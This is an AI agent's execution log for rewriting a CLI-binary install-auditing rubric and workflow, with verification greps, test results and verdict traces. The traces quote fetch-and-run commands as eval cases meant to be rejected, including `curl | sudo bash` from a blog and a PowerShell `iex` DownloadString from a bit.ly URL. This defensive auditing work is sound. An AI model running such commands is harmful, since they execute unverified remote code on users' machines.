# Execution Log: cli-binary-rubric-refresh

> **Status:** Complete
> **Started:** 20261016 20:15
> **Repo Root:** /home/user/install-auditor-skill
> **Plan File:** .projex/2610162006-cli-binary-rubric-refresh-plan.md
> **Parent:** 2610162006-cli-binary-rubric-refresh-plan.md
> **Base Branch:** claude/youthful-dijkstra-5ov1kt
> **Worktree Path:** .projexwt/2610162006-cli-binary-rubric-refresh

## Pre-Check Results

```
PASS  Plan is committed (376ba86 projex: add plans - container-image + cli-binary rubric refresh)
WARN  Working tree has 4 uncommitted change(s)
PRE-CHECK PASSED
```

WARN resolution: the 4 uncommitted entries in the main checkout are other plans' files (container-image plan modification; untracked ide-plugin, desktop-app, agent-extension, registry-package plans) owned by the orchestrator/other executions. Not this plan's files; left untouched. This plan file was clean and committed.

Plan status set to In Progress on base: ff2d0c8. Worktree created from base HEAD (f04068c at creation). Bootstrap: none needed (Python stdlib only; no gitignored deps).

Plan Preflight (in worktree): floor checks all 1/1/1/1/1, Abandoned → CONDITIONAL hit at criteria.md L126, `wc -l` 262 / 133 as expected; `evals/run_evals.py validate` → 41 evals, 248 assertions; `python3 -m unittest discover -s evals -p "test_*.py"` → Ran 12 tests OK (Preflight count = 12); `python3 -m unittest discover -s tests` → Ran 19 tests OK (skipped=6).

## Steps
### 20261016 20:22 - Step 1: Addendum header + Distribution Channel Trust Signals
**Action:** Spliced the plan's Step 1 "After" block verbatim (extracted programmatically from the plan's fenced block) over addendum L1-L37 (anchors: `# CLI Binary — Criteria Addendum` .. `- Third-party mirror = strong negative (equivalent to unsigned .exe from unknown site)`). 37 lines -> 47 lines.
**Result:** `grep -c "Homebrew third-party tap"` = 2 (>= 2); `grep -ci "build-from-source option\|Node.js Foundation"` = 0; line after block is blank, then `## Signature & Checksum Standards`. Self-verified (`git diff`, 29+/19-, 1 file).
**Status:** Success
### 20261016 20:25 - Step 2: Addendum Signature & Checksum Standards (identity-bound)
**Action:** Spliced Step 2 "After" block verbatim over the region `## Signature & Checksum Standards` .. `- No checksum or signature = MEDIUM-HIGH flag (no verification path)` (now L49-L69 after Step 1 shifted lines). 21 -> 32 lines.
**Result:** `grep -c "certificate-oidc-issuer\|--source-uri\|gh release verify-asset\|gh attestation verify"` = 4 (>= 4); `grep -c "provides audit trail"` = 0; boundary to `## Install Script Risk Classification` intact (blank line between). Self-verified.
**Status:** Success
### 20261016 20:27 - Step 3: Addendum Install Script Risk + Provenance Assessment
**Action:** Spliced Step 3 "After" block verbatim over `## Install Script Risk Classification` .. `- No source + no CI + no signature = weakest provenance, strong negative` (L82-L120 after earlier steps). 39 -> 55 lines.
**Result:** `grep -c "Executed-bytes rule\|Lure patterns\|Install-URL provenance"` = 3 (expected 3); heading order intact (Install Script Risk -> Provenance Assessment -> Tier Thresholds). Self-verified.
**Status:** Success
### 20261016 20:34 - Step 4: Addendum Tier Thresholds + §4.3 and §4.6 plug-ins
**Action:** (1) A2 check before splicing. `go install golang.org/x/vuln/cmd/govulncheck@latest` into the session scratchpad (outside the worktree), then `govulncheck -h`: usage line `govulncheck -mode=binary [flags] [binary]` and `-mode value  supports 'source', 'binary', and 'extract'`. Fetched the `cargo-audit` crate (0.22.2) source into a scratchpad cargo home: README section "`cargo audit bin` subcommand" ("Run `cargo audit bin` followed by the paths to your binaries"; "If your programs have been compiled with cargo auditable ..."). (2) Spliced Step 4 "After" block verbatim over `## Tier Thresholds (CLI Binaries)` .. EOF (L138-L170). 33 -> 56 lines.
**Result:** A2 confirmed for both names; no scanner name dropped. Verification greps: `## Version & Update Integrity (§4.6)` = 1; `- **V1**`..`- **V5**` = 5; `## Own Code vs Third-Party Components (§4.3)` = 1; `Curated pipeline — Homebrew core` = 1. File ends with a single newline. Addendum is now 193 lines. Self-verified.
**Status:** Success
### 20261016 20:41 - Step 5: Workflow header, Identify, Evidence (Parts A + B)
**Action:** Spliced the five "After" blocks verbatim, bottom-up (5e, 5d, 5c, 5b, 5a), each between exact anchor lines in `workflows/cli-binary.md`: 5e L102-L151 (50 -> 69 lines), 5d L82-L94 (13 -> 19), 5c L61-L67 (7 -> 10), 5b L38-L54 (17 -> 24), 5a L1-L32 (32 -> 36). Then rewrapped the 5d Tier 3 paragraph (wording unchanged; see Deviations).
**Result:** `grep -c "Homebrew third-party tap"` = 2 (>= 2); `grep -c 'verify-blob` or transparency log'` = 0; heading order matches the original (Identify 1-3, Evidence A, Evidence B incl. `### Audit coverage tracking`, Rubric, Verdict Notes); Identify metadata `**Author / organization**` and `**Repository**` bullets retained; old `**Signature**` / `**SLSA attestation**` bullets gone. Self-verified.
**Status:** Success
### 20261016 20:48 - Step 6: Workflow coverage table, Subject Rubric, Verdict Notes
**Action:** Spliced the Step 6 "After" block verbatim over `| Check | Tier 1 | Tier 2 | Tier 3 |` .. EOF (L197-L301 after Step 5 shifted lines). 105 -> 158 lines; workflow is now 354 lines.
**Result:** Step 6 greps: Toward REJECTED section "abandon" count = 0 (expected 0); `### §4.6 Version & Update Integrity` + `### Alternatives & Ecosystem Fit` = 2 (expected 2); `from established foundation|Node.js Foundation|### §4.6 Alternatives` = 0 (expected 0); Toward CONDITIONAL "REJECTED" line count = 2 vs plan's expected 1 (see Deviations: the REJECTED-only-with-another-trigger clause wraps over two lines in the plan's own verbatim text; clause present). Lead-in sentence of `### Audit coverage tracking` kept. Self-verified.
**Status:** Success

## Deviations

- Step 6 verification: the plan expects `grep -c "REJECTED"` over the Toward CONDITIONAL section = 1, but the plan's verbatim text puts "REJECTED" on two wrapped lines of one bullet ("alternative. REJECTED" / "only together with another REJECTED trigger"). The substantive criterion (Success Criteria bullet 6: section contains "abandoned" with the REJECTED-only-with-another-trigger clause) holds; the count is a line-wrap artifact of the plan, not a text defect. Text left verbatim.
- Step 5d: the plan's Tier 3 paragraph contains one 97-column prose line, which breaks the plan's own Constraint (workflow prose wraps at ~72-75 cols). Rewrapped that single paragraph at ~72 cols; word-for-word identical. No other text was altered.

## Issues Encountered

- Precheck WARN (4 uncommitted entries in the main checkout) belonged to other plans (container-image plan edit; untracked ide-plugin, desktop-app, agent-extension, registry-package plans). Not this plan's files; untouched. This plan was committed and clean.
- Base advanced during execution (other plans closed/added on `claude/youthful-dijkstra-5ov1kt`; worktree was cut from `f04068c`). `git diff <base>..HEAD` at the branch tip therefore shows unrelated files; the plan's scope check is correct against the merge base (`git diff --stat <base>...HEAD`): exactly `references/criteria/cli-binary.md`, `workflows/cli-binary.md` (+ this log). No overlap with the files base changed.
- No task-list tool was available in this environment (spec says "if your environment provides" one); step discipline was tracked through the per-step log entries and commits.

## Data Gathered

### Final verification (from `<work-root>`)
- Plan consistency script: `OK`.
- `python3 evals/run_evals.py validate` -> 41 evals, 248 assertions (82 deterministic, 166 model-graded).
- `python3 -m unittest discover -s evals -p "test_*.py"` -> Ran 12 tests, OK (same count as Preflight).
- `python3 -m unittest discover -s tests` -> Ran 19 tests, OK (skipped=6; same as Preflight).
- `git diff --stat <base>...HEAD`: 2 product files (`references/criteria/cli-binary.md` +/-148, `workflows/cli-binary.md` +/-228) + this log. `evals/`, `SKILL.md`, `references/criteria.md`, `references/classifier.md`: 0 files changed.
- Quality checks: no projex filenames in the shipped files; all 6 tables have consistent column counts (pipes in cells escaped); no trailing whitespace or tabs; "2026-10" markers present (addendum 2 lines, workflow 1 line).

### Success criteria
1. One `## Version & Update Integrity (§4.6)` with `- **V1**`..`- **V5**` (5), one `## Own Code vs Third-Party Components (§4.3)`: met (grep 1/5/1).
2. V2 names the curated pipeline (homebrew/core) with tap resolution + formula `url` checks: met (`Curated pipeline — Homebrew core` = 1).
3. Separate `Homebrew core formula` and `Homebrew third-party tap` rows in both files: met (script).
4. Commands present (`gh release verify`, `gh release verify-asset`, `gh attestation verify`, `cosign verify-blob --bundle` with `--certificate-identity` + `--certificate-oidc-issuer`, `slsa-verifier verify-artifact` with `--source-uri`): met (script + Step 2 grep).
5. Stale strings gone from both files: met (script).
6. Toward REJECTED has no "abandon"; Toward CONDITIONAL has it with the REJECTED-only-with-another-trigger clause: met (awk + script).
7. Every `§4.6 V<n>` is V1-V5: met (script).
8. validate + unittest pass with the Preflight count: met.
9. Paper traces T1-T14: all match (below).
10. Exactly 2 files in scope; protected files untouched: met.

### Paper traces (SKILL.md Step N tree + criteria.md §4.3/§4.6 + both edited files)
- T1 eval 20 `brew install ripgrep`: classifier signal 7 -> cli-binary; tap `homebrew/core` + formula `url` -> upstream = curated pipeline (addendum V2) = Tier 1 identity; Tier 1 list met (age >= 7 d depends on A3, time-dependent) -> APPROVED.
- T2 eval 21 `curl ... | sudo bash` from a blog, unknown domain: Tier 3 trigger; Install-URL provenance fails (blog copy); workflow Toward REJECTED bullet 1 -> CRITICAL -> REJECTED.
- T3 eval 30 terraform from a colleague's share, unhashed: Toward REJECTED mirror bullet requires bytes that *cannot* be verified (HashiCorp publishes a signed SHA256SUMS, so they can) -> does not fire; Toward CONDITIONAL informal-channel bullet fires with the verify-SHA-256 condition -> CONDITIONAL.
- T4 same copy, hash matches signed SHA256SUMS (key fingerprint from vendor docs): channel drops to a note, V2 verified (GPG row) -> no flags -> APPROVED reachable.
- T5 vendor-documented tap: vendor channel; Tier 1 text says "never a third-party tap" -> Tier 2 (Tier 2 lists "a Homebrew tap the vendor documents"); Toward CONDITIONAL "tap the vendor documents, with no verified identity", APPROVED if V2 verifies and V3 is clean.
- T6 `someuser/tools/ripgrep`, tap not in upstream docs: Tier 3 trigger "tap the upstream project does not document"; repackager; verifiable vs upstream -> CONDITIONAL at best, else Toward REJECTED mirror/repackager bullet; never Tier 1.
- T7 paste-to-verify `curl ... | bash` from non-vendor domain: lure bullet (both conditions hold) -> CRITICAL -> REJECTED.
- T8 org, immutable release 10 d old, `gh release verify-asset` passes for the documented repo: V1 >= 7 d, V2 verified, V3 clean, other Tier 1 conditions met -> Tier 1 -> APPROVED.
- T9 same org, release 20 h old, attestation from a different workflow: V1 `fresh version` HIGH + V3 HIGH (addendum Signature scoring "different repo, workflow, key or signer = HIGH flag (§4.6 V3)") -> CONDITIONAL; V3 HIGH triggers the escalation notice.
- T10 Volta via install script from vendor docs: no REJECTED trigger fires; workflow §4.2 "declared unmaintained = Abandoned"; Toward CONDITIONAL abandoned bullet names mise -> CONDITIONAL, not REJECTED.
- T11 Go binary, HIGH CVE in statically linked module, not KEV, no new binary release: addendum §4.3 plug-in = third-party component; criteria.md §4.3 table row 7.0-8.9 (third-party) -> HIGH flag -> CONDITIONAL (condition: mitigations + re-audit on fixed release); not REJECTED.
- T12 own-code CRITICAL in the requested version, KEV-listed: Blocking CVE -> REJECTED; Recommendation names the fixed release (criteria.md §4.3 "Fixed release" bullet).
- T13 eval 34 `iex ((New-Object System.Net.WebClient).DownloadString('http://bit.ly/toolsetup'))`: Tier 3 (PowerShell pipe-to-shell, any variant); Toward REJECTED pipe-to-shell bullet (`iex (... DownloadString ...)` from a shortener and plain HTTP) -> CRITICAL -> REJECTED; workflow tells the auditor to report where the shortener points without running it.
- T14 `irm https://<vendor>/install.ps1 | iex`, URL on the vendor's own install page: not hidden, HTTPS, documented -> not a REJECTED trigger; addendum Scoring impact: same as known-vendor `curl | sh` (LOW-MEDIUM); Toward CONDITIONAL known-vendor install script with the executed-bytes recommendation -> CONDITIONAL path, not auto-REJECTED.

Observations (no action taken; outside this plan's text):
- T3: addendum Scoring impact calls an unverified shared copy "strong negative" (a score), while the verdict is fixed by the Verdict Notes bullets (CONDITIONAL). Consistent as written; noted only because "strong negative" could be misread as a CRITICAL.
- T11: criteria.md §4.3 says the third-party-no-fix condition is "the routed workflow's mitigations"; the cli-binary workflow carries no explicit mitigation list, so the auditor will compose the mitigation (e.g. least privilege, sandbox, pin) in the Recommendation. Plan T11 only requires "mitigation + re-audit on fixed release", which holds.
- T14 vs addendum: Tier 3 trigger lists PowerShell `irm | iex` "from any source" while Scoring impact says "Tier 2 minimum" for the known-vendor form (the same pairing existed for `curl | sh` in the base text). Not changed.

### Spec compliance review
The only linked spec is the shared floor in `references/criteria.md` §4.6 / §4.3 and `SKILL.md` precedence: re-read; the plug-in heading convention (`## Version & Update Integrity (§4.6)`, bullets `V1`-`V5`), V2 curated-pipeline requirement (names what the auditor checks instead: tap resolution + formula `url`), V1 addendum items (publish-time source, version unit, condition wording), V3 ownership-transfer rating, V4 sources, V5 triggers/update controls, and the §4.3 own-code / third-party / fixed-release / scan / VEX lines are all met. The addendum only tightens or fills; no verdict class changed.

### Quality review
Re-read all changes: stale strings gone, section cross-references resolve (`§ Version & Update Integrity`, `§ Install Script Risk`, `§ Signature & Checksum Standards`), workflow heading collision fixed, no dead code or leftover plan text. Issue found and fixed in Step 5: one over-wide prose line (logged under Deviations).

### Cleanup
Worktree has no untracked or ignored artifacts (`git status` clean); no dependencies were installed there. Session-scratchpad probes (govulncheck binary, cargo-audit crate sources, splice helper) live outside the repo and worktree. No background processes were started.

## User Interventions
